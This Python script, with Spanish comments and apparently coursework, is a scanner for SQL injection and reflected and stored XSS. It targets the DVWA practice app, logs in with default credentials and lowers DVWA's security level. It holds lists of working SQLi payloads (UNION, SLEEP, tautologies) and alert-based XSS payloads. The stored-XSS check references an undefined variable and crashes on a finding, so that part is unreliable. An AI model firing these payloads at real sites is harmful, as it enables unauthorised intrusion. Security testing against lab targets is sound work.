import requests
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from tqdm import tqdm
import time
import re
from decouple import config
import warnings

# Cargar el objetivo y los parámetros desde el archivo .env
webVulnTarget = config('WEB_VULN_TARGET')
webLoginUsername = config('WEB_LOGIN_USERNAME', default='admin')
webLoginPassword = config('WEB_LOGIN_PASSWORD', default='password')

# Cargar los parámetros de control para las pruebas
runSqli = config('RUN_SQLI', default='false').lower() == 'true'
runXssReflected = config('RUN_XSS_REFLECTED', default='false').lower() == 'true'
runXssStored = config('RUN_XSS_STORED', default='false').lower() == 'true'

# Cargar las configuraciones de cada test desde el .env
sqliMethod = config('SQLI_METHOD', default='get')
sqliPath = config('SQLI_PATH', default='')
sqliParams = [p.strip() for p in config('SQLI_PARAMS', default='').split(',') if p.strip()]

xssReflectedMethod = config('XSS_REFLECTED_METHOD', default='get')
xssReflectedPath = config('XSS_REFLECTED_PATH', default='')
xssReflectedParams = [p.strip() for p in config('XSS_REFLECTED_PARAMS', default='').split(',') if p.strip()]

xssStoredSubmitPath = config('XSS_STORED_SUBMIT_PATH', default='')
xssStoredViewPath = config('XSS_STORED_VIEW_PATH', default='')
xssStoredSubmitParams = [p.strip() for p in config('XSS_STORED_SUBMIT_PARAMS', default='').split(',') if p.strip()]

class WebVulnScanner:
    """
    Clase que implementa una herramienta para detectar SQL Injection y XSS.
    """
    def __init__(self, baseUrl: str):
        parsedUrl = urlparse(baseUrl)
        if not parsedUrl.scheme or not parsedUrl.netloc:
            raise ValueError(f"URL base '{baseUrl}' no es válida o no tiene un esquema (ej. http:// o https://).")
            
        self.baseUrl = baseUrl.rstrip('/') + '/'
        self.session = requests.Session()
        self.vulnerabilitiesFound = []
        self.commonSqlErrors = [
            "mysql_fetch_array", "ORA-01756", "Microsoft OLE DB", "SQL syntax",
            "You have an error in your SQL syntax", "Warning: mysql_fetch_array()",
            "SQLSTATE", "ODBC SQL", "PostgreSQL query failed", "supplied argument is not a valid MySQL"
        ]
        
        self.xssPayloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<body onload=alert('XSS')>"
        ]
        self.xssIndicators = [
            "alert('XSS')", "<script>alert('XSS')</script>", "javascript:alert"
        ]

    def sendRequest(self, method: str, url: str, params: dict = None, data: dict = None, json: dict = None, timeout: int = 5, allowRedirects=True):
        """
        Método auxiliar para enviar peticiones HTTP/HTTPS con manejo de errores.
        """
        print(f"[*] Accediendo a: {url}")
        try:
            if method.lower() == 'get':
                response = self.session.get(url, params=params, timeout=timeout, allow_redirects=allowRedirects)
            elif method.lower() == 'post':
                response = self.session.post(url, data=data, json=json, timeout=timeout, allow_redirects=allowRedirects)
            else:
                print(f"[*] Método HTTP no soportado: {method}")
                return None
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            print(f"[*] Error HTTP {e.response.status_code} al acceder a {url}. Respuesta: {e.response.text[:100]}...")
            return e.response
        except requests.exceptions.ConnectionError as e:
            print(f"[*] Error de conexión a {url}: {e}")
            return None
        except requests.exceptions.Timeout:
            print(f"[*] Timeout al acceder a {url}")
            return None
        except Exception as e:
            print(f"[*] Error inesperado al enviar petición a {url}: {e}")
            return None

    def getDvwaCsrfToken(self, url: str) -> str:
        """
        Extrae el token anti-CSRF de una página de DVWA.
        """
        try:
            response = self.sendRequest('get', url)
            if response and response.status_code == 200:
                soup = BeautifulSoup(response.text, 'lxml')
                tokenField = soup.find('input', {'name': 'user_token', 'type': 'hidden'})
                if tokenField:
                    return tokenField['value']
                else:
                    print(f"[*] Advertencia: No se encontró el token CSRF en {url}.")
            else:
                print(f"[*] Falló la obtención de la página para el token CSRF: {url}. Estado: {response.status_code if response else 'N/A'}")
        except Exception as e:
            print(f"[*] Error al intentar obtener el token CSRF de {url}: {e}")
        return ""

    def checkSqlInjection(self, url: str, paramNames: list, method: str = 'get'):
        """
        Testea SQL Injection basada en errores, tiempo y patrones de respuesta.
        """
        print(f"\n--- Probando SQL Injection en: {url} (Método: {method.upper()}) ---")
        payloadsToTest = [
            "' OR '1'='1 --",
            "' OR '1'='2 --",
            "\" OR \"1\"=\"1 --",
            "\" OR \"1\"=\"2 --",
            "admin'--",
            "admin' OR 1=1 --",
            "1 OR 1=1",
            "1 AND 1=2",
            "'; WAITFOR DELAY '00:00:05'--",
            " UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT @@version,NULL,NULL,NULL--",
            " AND (SELECT SLEEP(5))--"
        ]
        
        if not paramNames:
            print("[*] No se proporcionaron nombres de parámetros para SQLi.")
            return

        baseParams = {name: "test_value" for name in paramNames}
        
        totalTests = len(payloadsToTest) * len(paramNames)
        with tqdm(total=totalTests, desc="Testeando SQLi", unit="payloads", ncols=80) as pbar:
            for paramName in paramNames:
                for payload in payloadsToTest:
                    currentParams = baseParams.copy()
                    currentParams[paramName] = currentParams[paramName] + payload
                    
                    response = None
                    if method.lower() == 'get':
                        response = self.sendRequest('get', url, params=currentParams)
                    elif method.lower() == 'post':
                        response = self.sendRequest('post', url, data=currentParams)

                    if response:
                        for errorPattern in self.commonSqlErrors:
                            if errorPattern.lower() in response.text.lower():
                                vulnerabilityDetails = {
                                    "type": "SQL Injection (Error-based)",
                                    "url": url,
                                    "parameter": paramName,
                                    "payload": payload,
                                    "proof": f"Error pattern '{errorPattern}' found."
                                }
                                self.vulnerabilitiesFound.append(vulnerabilityDetails)
                                print(f"\n[!!!] SQLi (Error-based) detectado en '{paramName}' con payload: {payload}")
                                pbar.colour = 'red'
                                break
                        
                        if "WAITFOR DELAY" in payload or "SLEEP" in payload:
                            startTime = time.time()
                            if method.lower() == 'get':
                                responseTimeBased = self.sendRequest('get', url, params=currentParams)
                            elif method.lower() == 'post':
                                responseTimeBased = self.sendRequest('post', url, data=currentParams)

                            if responseTimeBased:
                                endTime = time.time()
                                elapsedTime = endTime - startTime
                                if elapsedTime > 5 + 3:
                                    vulnerabilityDetails = {
                                        "type": "SQL Injection (Time-based Blind)",
                                        "url": url,
                                        "parameter": paramName,
                                        "payload": payload,
                                        "proof": f"Response took {elapsedTime:.2f} seconds (expected around 5s)."
                                    }
                                    self.vulnerabilitiesFound.append(vulnerabilityDetails)
                                    print(f"\n[!!!] SQLi (Time-based Blind) detectado en '{paramName}' con payload: {payload}")
                                    pbar.colour = 'red'
                    
                    pbar.update(1)

    def checkXssReflected(self, url: str, paramNames: list, method: str = 'get'):
        """
        Testea XSS Reflected (no persistente) inyectando payloads y buscando su reflejo.
        """
        print(f"\n--- Probando XSS Reflected en: {url} (Método: {method.upper()}) ---")
        
        if not paramNames:
            print("[*] No se proporcionaron nombres de parámetros para XSS Reflected.")
            return

        baseParams = {name: "test_value" for name in paramNames}
        
        totalTests = len(self.xssPayloads) * len(paramNames)
        with tqdm(total=totalTests, desc="Testeando XSS Reflected", unit="payloads", ncols=80) as pbar:
            for paramName in paramNames:
                for payload in self.xssPayloads:
                    currentParams = baseParams.copy()
                    currentParams[paramName] = payload
                    
                    response = None
                    if method.lower() == 'get':
                        response = self.sendRequest('get', url, params=currentParams)
                    elif method.lower() == 'post':
                        response = self.sendRequest('post', url, data=currentParams)

                    if response and response.status_code == 200:
                        responseTextLower = response.text.lower()
                        for indicator in self.xssIndicators:
                            if indicator.lower() in responseTextLower:
                                vulnerabilityDetails = {
                                    "type": "XSS Reflected",
                                    "url": url,
                                    "parameter": paramName,
                                    "payload": payload,
                                    "proof": f"Payload '{payload}' or indicator '{indicator}' reflected in response."
                                }
                                self.vulnerabilitiesFound.append(vulnerabilityDetails)
                                print(f"\n[!!!] XSS Reflected detectado en '{paramName}' con payload: {payload}")
                                pbar.colour = 'red'
                                break
                    pbar.update(1)

    def checkXssStored(self, submitUrl: str, viewUrl: str, submitParamNames: list):
        """
        Simula la detección de XSS Stored.
        """
        print(f"\n--- Probando XSS Stored (simulado) en: {submitUrl} ---")

        if not submitParamNames:
            print("[*] No se proporcionaron nombres de parámetros para el envío de XSS Stored.")
            return

        payload = "<script>alert('XSS_Stored')</script>"

        totalTests = len(submitParamNames)
        with tqdm(total=totalTests, desc="Testeando XSS Stored", unit="payloads", ncols=80) as pbar:
            for paramName in submitParamNames:
                baseSubmitParams = {name: "test_value" for name in submitParamNames}
                testParams = baseSubmitParams.copy()
                testParams[paramName] = payload

                print(f"[*] Intentando obtener el token CSRF de {submitUrl}...")
                csrfToken = self.getDvwaCsrfToken(submitUrl)
                if not csrfToken:
                    print(f"[*] No se pudo obtener el token CSRF de {submitUrl}. Saltando prueba para este parámetro.")
                    pbar.update(1)
                    continue

                testParams['user_token'] = csrfToken
                testParams['submit'] = 'Submit'

                print(f"[*] Enviando payload XSS Stored a '{paramName}' en {submitUrl} con token CSRF...")
                submitResponse = self.sendRequest('post', submitUrl, data=testParams, allowRedirects=True)
                
                if submitResponse and submitResponse.status_code == 200:
                    if "Comment has been added!" in submitResponse.text:
                        print(f"[*] Payload enviado exitosamente. Verificando reflejo en {viewUrl}...")
                        time.sleep(1)

                        viewResponse = self.sendRequest('get', viewUrl)
                        
                        if viewResponse and viewResponse.status_code == 200:
                            if payload.lower() in viewResponse.text.lower():
                                vulnerabilityDetails = {
                                    "type": "XSS Stored (Simulated)",
                                    "submitUrl": submitUrl,
                                    "viewUrl": viewUrl,
                                    "parameter": paramName,
                                    "payload": payload,
                                    "proof": f"Payload '{payload}' found in {viewUrl} after submission."
                                }
                                self.vulnerabilitiesFound.append(vulnerabilidadDetails)
                                print(f"\n[!!!] XSS Stored detectado (simulado) en '{paramName}'.")
                                pbar.colour = 'red'
                            else:
                                print(f"[*] Payload no reflejado en {viewUrl}.")
                        else:
                            print(f"[*] No se pudo acceder a la URL de visualización: {viewUrl}")
                    else:
                        print(f"[*] El envío del payload parece no haber sido exitoso.")
                else:
                    print(f"[*] Falló el envío del payload a {submitUrl} (HTTP Status: {submitResponse.status_code if submitResponse else 'N/A'}).")
                pbar.update(1)

    def generateReport(self):
        """
        Genera un reporte simple de las vulnerabilidades encontradas.
        """
        print("\n=== REPORTE DE VULNERABILIDADES ===")
        if not self.vulnerabilitiesFound:
            print("No se encontraron vulnerabilidades.")
            return

        for i, vuln in enumerate(self.vulnerabilitiesFound):
            print(f"\n--- Vulnerabilidad {i+1} ---")
            print(f"Tipo: {vuln['type']}")
            print(f"URL Afectada: {vuln.get('url') or vuln.get('submitUrl')}")
            if 'parameter' in vuln:
                print(f"Parámetro: {vuln['parameter']}")
            print(f"Payload Utilizado: {vuln['payload']}")
            print(f"Evidencia: {vuln['proof']}")
            print("-" * 30)
        print("\nReporte de vulnerabilidades completado.")

def main():
    warnings.filterwarnings("ignore", category=UserWarning, module='urllib3')

    print("=== Herramienta de Detección de Vulnerabilidades Web (Requerimiento 3) ===")
    print("La URL base y los parámetros se cargan desde las variables en tu archivo .env.")

    scanner = WebVulnScanner(webVulnTarget)

    print("\n[*] Intentando autenticar en DVWA (si TARGET es una URL de DVWA)...")
    loginUrl = urljoin(scanner.baseUrl, "login.php")
    
    loginData = {
        'username': webLoginUsername,
        'password': webLoginPassword,
        'Login': 'Login',
        'user_token': scanner.getDvwaCsrfToken(loginUrl) 
    }
    loginResponse = scanner.sendRequest('post', loginUrl, data=loginData)
    if loginResponse and "You have logged in as 'admin'" in loginResponse.text:
        print("[+] Autenticación en DVWA exitosa.")
        securityUrl = urljoin(scanner.baseUrl, "security.php")
        securityData = {
            'security': 'low',
            'seclev_submit': 'Submit',
            'user_token': scanner.getDvwaCsrfToken(securityUrl)
        }
        securityResponse = scanner.sendRequest('post', securityUrl, data=securityData)
        if securityResponse and "Security level set to low" in securityResponse.text:
            print("[+] Nivel de seguridad de DVWA configurado a 'low'.")
        else:
            print("[-] Falló la configuración del nivel de seguridad de DVWA a 'low'.")
    else:
        print("[-] Falló la autenticación en DVWA. Asegúrate de que las credenciales son correctas y el servicio está activo.")

    # --- Ejecutar pruebas basadas en la configuración del .env ---
    if runSqli:
        fullSqliUrl = urljoin(scanner.baseUrl, sqliPath)
        scanner.checkSqlInjection(fullSqliUrl, paramNames=sqliParams, method=sqliMethod)

    if runXssReflected:
        fullXssReflectedUrl = urljoin(scanner.baseUrl, xssReflectedPath)
        scanner.checkXssReflected(fullXssReflectedUrl, paramNames=xssReflectedParams, method=xssReflectedMethod)

    if runXssStored:
        fullXssSubmitUrl = urljoin(scanner.baseUrl, xssStoredSubmitPath)
        fullXssViewUrl = urljoin(scanner.baseUrl, xssStoredViewPath)
        scanner.checkXssStored(fullXssSubmitUrl, fullXssViewUrl, submitParamNames=xssStoredSubmitParams)
        
    scanner.generateReport()
    print("\n--- Detección de vulnerabilidades web completada ---")

if __name__ == "__main__":
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        print("[!] La librería 'beautifulsoup4' no está instalada. Ejecute 'pip install beautifulsoup4 lxml' para la detección de vulnerabilidades web.")
    
    main()